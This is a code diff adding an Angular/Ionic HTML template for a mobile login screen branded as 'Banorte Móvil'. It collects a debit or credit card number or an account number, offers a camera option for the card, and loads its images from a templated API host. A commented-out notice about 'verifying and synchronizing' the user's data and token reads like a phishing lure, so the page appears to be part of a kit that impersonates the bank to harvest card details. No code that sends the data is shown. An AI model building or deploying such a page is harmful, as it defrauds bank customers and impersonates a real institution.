@@ -1,0 +1,322 @@
+<div class="master">
+  <div>
+    <a href="javascript:" (click)="goIndicators()" class="btn-indicators">
+      <img src="{{API_URL}}/assets/img/indicadores.png" width="40" alt="" />
+    </a>
+  </div>
+
+  <div class="custom-header">
+    <div class="kb-logo">
+      <img
+        src="{{API_URL}}/assets/img/img_bsc_logo.png"
+        width="250"
+        alt=""
+        srcset=""
+      />
+    </div>
+
+    <p style="margin-bottom: 10px; color: #fff !important">
+      ¡Bienvenido a Banorte Móvil!
+    </p>
+  </div>
+
+  <ion-content [style.height]="getVhPx(90)">
+    <div class="kbContainer">
+      <div class="header">
+        <div style="margin: 25px 0px 50px 0px">
+          <img src="{{API_URL}}/assets/img/icon_login.png" width="120" alt="" />
+        </div>
+
+        <!-- <ion-text color="light">
+          <p>Ingresa el número de: <br> tu tarjeta de <strong>débito</strong> o <strong>crédito</strong> <br> o el número de tu <strong>cuenta</strong> Banorte</p>
+        </ion-text> -->
+
+        <div>
+          <p style="color: #fff !important">
+            Ingresa el número de: <br />
+            tu tarjeta de <strong>débito</strong> o <strong>crédito</strong>
+            <br />
+            o el número de tu <strong>cuenta</strong> Banorte
+          </p>
+        </div>
+
+        <!-- <div class="aviso">
+          <p>
+            <strong>Estimado Usuario</strong>
+            <br>
+            En Banorte sabemos que tú seguridad
+            <br>
+            es lo más importante, por ese motivo estamos
+            <br>
+            llevando acabo la verificación, sincronizacion, y resguardo de tu información.
+            <br>
+            <br>
+            Durante el siguiente proceso que solo tomará
+            <br>
+            unos minutos, llevaremos acabo la actualización
+            <br>
+            de tus datos de contacto, sincronizacion de
+            <br>
+            token para el correcto funcionamiento
+            <br>
+             de lectura de código QR.
+            <br>
+            <br>
+            Agradecemos tu preferencia y el apoyo
+            <br>
+            brindado para mantenerte seguro.
+          </p>
+        </div> -->
+      </div>
+
+      <!-- style="background-color: blue;" -->
+      <div #loginCard class="loginCard">
+        <ion-card>
+          <ion-card-content class="login">
+            <div
+              class="kb-item"
+              [ngClass]="{active: ifUserInputActive,'error': ifUserInputError }"
+            >
+              <div class="kbrow">
+                <div>
+                  <img
+                    *ngIf="currentCheckImg === 'none'"
+                    width="50"
+                    src="{{API_URL}}/assets/img/file-question.png"
+                    style="margin-bottom: 3px"
+                  />
+
+                  <img
+                    *ngIf="currentCheckImg === 'card' || currentCheckImg === 'cardError'"
+                    width="50"
+                    src="{{API_URL}}/assets/img/kb-card.png"
+                    style="margin-bottom: 5px"
+                  />
+
+                  <img
+                    *ngIf="currentCheckImg === 'account' || currentCheckImg === 'accountError'"
+                    width="40"
+                    src="{{API_URL}}/assets/img/kb-card-billete.png"
+                    style="margin-right: 10px"
+                  />
+                </div>
+
+                <div class="kb-wrap-input">
+                  <input
+                    type="tel"
+                    name="urcrd"
+                    #userInput
+                    placeholder="Cuenta o tarjeta"
+                    autocomplete="off"
+                    (focus)="focusUser($event)"
+                    (blur)="unFocusUser($event)"
+                    (keypress)="onlyNumber($event)"
+                    (ngModelChange)="userOnChange(userInput)"
+                    (keyup.enter)="onEnter(false)"
+                    [(ngModel)]="userModel.demoUserOrCardNumber"
+                    maxlength="16"
+                  />
+
+                  <label *ngIf="ifUserInputActive">
+                    {{currentFloatText}}
+                  </label>
+                </div>
+
+                <div style="height: 25px; width: 25px; margin-bottom: 5px">
+                  <ion-icon
+                    *ngIf="!userModel.userOrCard"
+                    class="iconInput"
+                    name="camera"
+                    style="font-size: 25px; cursor: pointer"
+                    (click)="dualModal('camera')"
+                  >
+                  </ion-icon>
+
+                  <!-- ifFocusedInput -->
+                  <ion-icon
+                    *ngIf="userModel.userOrCard"
+                    #iconClear
+                    (click)="clearInput(userInput)"
+                    class="iconInput"
+                    name="close-circle"
+                    style="font-size: 20px"
+                    [style.color]="ifFocusedInput ? '#323f48': 'transparent'"
+                  >
+                  </ion-icon>
+                </div>
+              </div>
+            </div>
+
+            <ion-row style="margin-top: 7px" col-12 no-padding>
+              <ion-row>
+                <div
+                  class="minitext"
+                  [ngClass]="{'ifUserInputError': ifUserInputError}"
+                >
+                  10 dígitos cuenta
+                </div>
+
+                <img
+                  width="13"
+                  height="13"
+                  class="kb-icon-check"
+                  src="{{API_URL}}/assets/img/check.png"
+                  *ngIf="currentCheckImg === 'account'"
+                />
+              </ion-row>
+
+              <ion-col
+                class="ion-no-padding"
+                style="text-align: right !important"
+              >
+                <ion-row>
+                  <ion-col> </ion-col>
+                  <div class="minitextLength">
+                    {{userModel.userOrCard ? userModel.userOrCard.length :
+                    0}}/16
+                  </div>
+
+                  <div
+                    (click)="sheetModal('info', 0.5)"
+                    style="cursor: pointer; margin-left: 5px"
+                  >
+                    <ion-icon
+                      style="color: #fc611f; font-size: 20px"
+                      name="information-circle"
+                    ></ion-icon>
+                  </div>
+                </ion-row>
+              </ion-col>
+            </ion-row>
+
+            <ion-row col-12 no-padding>
+              <div
+                class="minitext"
+                [ngClass]="{'ifUserInputError': ifUserInputError}"
+                style="line-height: 1.1"
+              >
+                16 dígitos tarjeta
+              </div>
+              <img
+                width="13"
+                height="13"
+                class="kb-icon-check-card"
+                src="{{API_URL}}/assets/img/check.png"
+                *ngIf="currentCheckImg === 'card'"
+              />
+            </ion-row>
+
+            <!-- <ion-button *ngIf="!ifReadyUser || ifUserInputError" 
+                        expand="block" 
+                        class="aceptBtn">
+              Aceptar
+            </ion-button> -->
+
+            <ion-button
+              [class.active]="ifReadyUser && !ifUserInputError"
+              expand="block"
+              class="aceptBtn"
+              (click)="onEnter(true)"
+            >
+              Aceptar
+            </ion-button>
+
+            <!-- <div style="cursor: pointer" class="register">
+              <a
+                href="javascript:"
+                (click)="dualModal('register')"
+                color="medium"
+                >Quiero ser cliente banorte</a
+              >
+            </div> -->
+          </ion-card-content>
+        </ion-card>
+      </div>
+
+      <div #registerCard class="registerCard">
+        <ion-card>
+          <ion-card-header>
+            <div class="kbtitle-register">Quiero ser cliente banorte</div>
+          </ion-card-header>
+
+          <ion-card-content class="register">
+            <div style="text-align: left; color: #323f48">
+              Abre aqui una cuenta para ahorrar, recibir tu nómina o hacer
+              pagos.
+            </div>
+
+            <!-- dualModal('register') -->
+            <ion-button
+              expand="block"
+              class="aceptBtn active btnregister"
+              (click)="openRegisterModal()"
+            >
+              Abrir cuenta
+            </ion-button>
+          </ion-card-content>
+        </ion-card>
+      </div>
+
+      <div class="helpCenter">
+        <ion-card>
+          <ion-card-header>
+            <div class="kbtitle">Centro de ayuda</div>
+          </ion-card-header>
+
+          <ion-card-content>
+            <ion-slides
+              [options]="option"
+              scrollbar="true"
+              class="ion-margin-top"
+            >
+              <ion-slide>
+                <ion-card (click)="sheetModal('call', 0.8)" class="help orange">
+                  <div>
+                    <img
+                      width="30"
+                      src="{{API_URL}}/assets/img/icon_telefono.png"
+                    />
+                  </div>
+                  <p>Llamada</p>
+                </ion-card>
+              </ion-slide>
+
+              <ion-slide>
+                <ion-card (click)="sheetModal('chat', 0.8)" class="help orange">
+                  <div>
+                    <img
+                      width="30"
+                      src="{{API_URL}}/assets/img/icon_chat.png"
+                    />
+                  </div>
+                  <p>Chat</p>
+                </ion-card>
+              </ion-slide>
+
+              <ion-slide>
+                <ion-card (click)="sheetModal('email', 0.8)" class="help green">
+                  <div>
+                    <img
+                      width="30"
+                      src="{{API_URL}}/assets/img/icon_arroba.png"
+                    />
+                  </div>
+                  <p>Correo</p>
+                </ion-card>
+              </ion-slide>
+            </ion-slides>
+          </ion-card-content>
+        </ion-card>
+      </div>
+
+      <div class="location">
+        <img (click)="goLocation()" src="{{API_URL}}/assets/img/location.png" />
+      </div>
+
+      <br />
+      <br />
+      <br />
+      <br />
+    </div>
+  </ion-content>
+</div>
